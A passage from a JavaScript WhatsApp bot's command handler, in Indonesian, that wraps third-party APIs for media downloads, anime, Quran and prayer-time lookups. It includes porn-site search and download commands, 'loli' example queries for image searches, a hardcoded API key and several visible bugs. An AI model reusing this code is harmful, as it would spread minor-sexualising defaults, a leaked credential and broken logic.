                    ini_txt += `Deskripsi : ${get_result.deskripsi}`
                    reply(ini_txt)
                    break
                case 'tebakumur':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Manik`)
                    ini_name = args.join(" ")
                    if (args.length == 0) return reply(`Example: ${prefix + command} Manik`)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/tebakumur?apikey=${lolkey}&name=${ini_name}`)
                    get_result = get_result.result
                    ini_txt = `Nama : ${get_result.name}\n`
                    ini_txt += `Umur : ${get_result.age}`
                    reply(ini_txt)
                    break

                    // Entertainment
                case 'wancak':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/onecak?apikey=${lolkey}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break

                    // Creator                                    
                case 'ig':
case 'igdl':
case 'instagram':
if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('Linknya?')
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${args[0]}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
									case 'tiktok':
									case 'tiktokdl':
									case 'tiktoknowm':
									if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
									if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
									if (!q) return reply('Linknya?')
									var { TiktokDownloader } = require('./lib/tiktokdl')
reply(mess.wait)
res = await TiktokDownloader(`${q}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from, `${res.result.nowatermark}`)
break
									case 'tiktokmusic': case 'tiktokaudio':  
									if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
									if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid Link')
									if (!q) return reply('Linknya?')
									hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
    nowmm = await getBuffer(audio)
	zacky.sendMessage(from,nowmm ,MessageType.audio,{mimetype:'audio/mp4',quoted: mek})
		})
		})
		break 
                    case 'tourl':
if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await zacky.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break
                case 'tiktokmusic':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Lu sudah terbenned!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_link = args[0]
                    get_audio = await getBuffer(`http://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolkey}&url=${ini_link}`)
                    zacky.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek})
                    break
                case 'spotify':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Lu sudah terbenned!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotify?apikey=${lolkey}&url=${url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Popularity : ${get_result.popularity}\n`
                    ini_txt += `Preview : ${get_result.preview_url}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link[3].link)
                    zacky.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: mek})
                    break
                case 'spotifysearch':
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotifysearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Artists : ${x.artists}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Preview : ${x.preview_url}\n\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'jooxplay':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jooxplay?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.info.song}\n`
                    ini_txt += `Artists : ${get_result.info.singer}\n`
                    ini_txt += `Duration : ${get_result.info.duration}\n`
                    ini_txt += `Album : ${get_result.info.album}\n`
                    ini_txt += `Uploaded : ${get_result.info.date}\n`
                    ini_txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    zacky.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: mek})
                    break
                case 'igdl':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/instagram?apikey=${lolkey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_type = image
                    if (ini_url.includes(".mp4")) ini_type = video
                    ini_buffer = await getBuffer(ini_url)
                    zacky.sendMessage(from, ini_buffer, ini_type, { quoted: mek})
                    break
                case 'fbdl':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/facebook?apikey=${lolkey}&url=${ini_url}`)
                    ini_url = ini_url.result[0].link
                    ini_buffer = await getBuffer(ini_url)
                    zacky.sendMessage(from, ini_buffer, video, { quoted: mek})
                    break
                case 'zippyshare':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www51.zippyshare.com/v/5W0TOBz1/file.html`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/zippyshare?apikey=${lolkey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_txt = `File Name : ${ini_url.name_file}\n`
                    ini_txt += `Size : ${ini_url.size}\n`
                    ini_txt += `Date Upload : ${ini_url.date_upload}\n`
                    ini_txt += `Download Url : ${ini_url.download_url}`
                    reply(ini_txt)
                    break
                case 'pinterest':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=${query}`)
                    ini_url = ini_url.result
                    ini_buffer = await getBuffer(ini_url)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'pinterestdl':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://id.pinterest.com/pin/696580267364426905/`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterestdl?apikey=${lolkey}&url=${ini_url}`)
                    ini_url = ini_url.result[0]
                    ini_buffer = await getBuffer(ini_url)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'pixiv':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/pixiv?apikey=${lolkey}&query=${query}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'pixivdl':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 63456028`)
                    query = args[0]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/pixivdl/${pixivid}?apikey=${lolkey}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'xhamstersearch':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xhamstersearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xhamster':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://xhamster.com/videos/party-with-friends-end-in-awesome-fucking-5798407`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xhamster?apikey=${lolkey}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Uploader : ${get_result.author}\n`
                    ini_txt += `Upload : ${get_result.upload}\n`
                    ini_txt += `View : ${get_result.views}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.likes}\n`
                    ini_txt += `Dislike : ${get_result.dislikes}\n`
                    ini_txt += `Comment : ${get_result.comments}\n`
                    ini_txt += "Link : \n"
                    link = get_result.link
                    for (var x of link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'xnxxsearch':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxxsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xnxx':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxx?apikey=${lolkey}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break

                    // AniManga //
                case 'character':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Miku Nakano`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/character?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Name : ${get_result.name.full}\n`
                    ini_txt += `Native : ${get_result.name.native}\n`
                    ini_txt += `Favorites : ${get_result.favourites}\n`
                    ini_txt += `Media : \n`
                    ini_media = get_result.media.nodes
                    for (var x of ini_media) {
                        ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
                    }
                    ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, "_")}`
                    thumbnail = await getBuffer(get_result.image.large)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'manga':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/manga?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Chapters : ${get_result.chapters}\n`
                    ini_txt += `Volume : ${get_result.volumes}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'anime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/anime?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
case 'broadcast':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if(!isOwner) return reply("Command only for owner bot")
                    list_chat = await zacky.chats.all()
                    ini_text = args.join(" ")
                    for (let chat of list_chat) {
                        sendMess(chat.jid, ini_text)
                    }
                    break
			case 'superhero':
                    get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/superhero?apikey=KatoNiBoss&query=${body.slice(11)}`)
                    get_result = get_result.result
		    txt = `Id : ${get_result.id}\n`
                    txt += `Nama : ${get_result.name}\n`
                    txt = `Status : ${get_result.powerstats.intelligence} - ${get_result.powerstats.strength} - ${get_result.powerstats.speed} - ${get_result.powerstats.durability} - ${get_result.powerstats.power} - ${get_result.powerstats.combat}\n`
                    txt += `BioGrap : ${get_result.biography.full-name} - ${get_result.biography.alter-egos}\n`
                    txt += `Series : ${get_result.aliases}\n`
                    txt += `Ultah : ${get_result.place-of-birth}\n`
                    txt += `Place : ${get_result.first-appearance}\n`
                    txt += `Publish : ${get_result.publisher}\n`
                    txt += `Rating : ${get_result.alignment}\n`
                    txt += `Gender : ${get_result.appearance.gender}\n`
                    txt += `Race : ${get_result.appearance.race}\n`
                    txt += `Height : ${get_result.appearance.height}\n`
                    txt += `Warna mata : ${get_result.appearance.eye-color}\n`
                    txt += `Warna rambut : ${get_result.appearance.hair-color}\n`
                    txt += `Work : ${get_result.work.occupation} - ${get_result.work.base} - ${get_result.work.connections}\n`
                    buffer = await getBuffer(get_result.image.url)
                    zacky.sendMessage(from, buffer, image, { quoted: mek, caption: txt })
                    break
		//pic//
		case 'getpic':
					if (args.length < 1) return 
					if (zacky.message.extendedTextMessage === undefined || zacky.message.extendedTextMessage === null) return reply('Siap Boss')
					mentioned = zacky.message.extendedTextMessage.contextInfo.mentionedJid[0]
						try {
						pp = await zacky.getProfilePicture(mentioned)
						buffer = await getBuffer(pp)
						
						zacky.sendMessage(from, buffer, image, {quoted: mek})
					} catch (err) {
						zacky.sendMessage(from, buffer, image, {quoted:lol})
					}
					break
                    // Islami //
                case 'listsurah':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/quran?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'alquran':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                    urls = `http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${lolkey}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    reply(ini_txt)
                    break
                case 'alquranaudio':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                    surah = args[0]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${lolkey}`)
                    zacky.sendMessage(from, ini_buffer, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })
                    break
                case 'asmaulhusna':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    break
                case 'kisahnabi':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    reply(ini_txt)
                    break
                case 'jadwalsholat':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    break

                    // Downloader //                
                case 'play':
                case 'ytplay':
	    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
        if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Never gonna give you up`)
                    query = args.join(" ") 
                    anu = await fetchJson(`https://api.zeks.me/api/ytplaymp3?apikey=${zekskey}&q=${query}`)                   
                    anu2 = await fetchJson(`https://api.zeks.me/api/ytplaymp4?apikey=${zekskey}&q=${query}`)							
play = `┌───「 *🎧 PLAY MUSIC* 」
│
├ *TITLE* : ${anu.result.title}
├ *DURASI* : ${anu.result.duration}
├ *LINK* :
│ ${anu.result.source}
│
├ *SIZE MP3* : ${anu.result.size}
├ *SIZE MP4* : ${anu2.result.size}
│
└───「 *${NamaBot}* 」`
			   buttons = [{buttonId:`${prefix}buttons1 ${anu.result.source}`,buttonText:{displayText: '🎵 AUDIO'},type:1},                              
               {buttonId:`${prefix}buttons2 ${anu.result.source}`,buttonText:{displayText: '◀️ VIDEO'},type:1}]
               
               let contol = await getBuffer(anu.result.thumbnail)
               const meditod = await zacky.prepareMessage(from, contol, MessageType.image, { thumbnail: anu.result.thumbnail})
               let bacotluh = meditod.message["ephemeralMessage"] ? meditod.message.ephemeralMessage : meditod
               
               buttonsMessage = {
               contentText: `${play}`,
               footerText: `${wib} WIB\n${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`,
               imageMessage: bacotluh.message.imageMessage,
               buttons: buttons,
               headerType: 4
}
               prep = await zacky.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo: {forwardingScore: 1000, isForwarded: true}})
               zacky.relayWAMessage(prep)
               break
                case 'play2':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play2* _Judul lagu yang akan dicari_`)
                            const playy = await axios.get(`https://bx-hunter.herokuapp.com/api/yt/search?query=${body.slice(6)}&apikey=${HunterApi}`)
                            const mulaikah = playy.data.result[0].url
                            try {
                                sticWait(from)
                                yta(mulaikah)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
                                    sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"🔖 PLAY MP3",mediaType:"2",thumbnail:fpp,mediaUrl:"https://youtu.be/7eZKvZmyENc"}}}).catch(() => reply(mess.error.api))
                                    })
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }
                            break
                case 'ytplay2':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytplay2?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek, caption: get_result.title })
                    get_audio = await getBuffer(get_result.audio)
                    zacky.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, filename: `${get_result.title}.mp3`, quoted: mek})
                    get_video = await getBuffer(get_result.video)
                    zacky.sendMessage(from, get_video, video, { mimetype: Mimetype.mp4, filename: `${get_result.title}.mp4`, quoted: mek})
                    break
		    case 'ytmp33':
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/ytaudio2?apikey=KatoNiBoss&url=${ini_link}`)
                    get_result = get_result.result
                    txt = `Title : ${get_result.title}\n`
                    buffer = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, buffer, image, { quoted: mek, caption: txt })
		    get_audio = await getBuffer(get_result.link[0])
		    zacky.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: mek })
                    break
                case 'ytsearch':
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
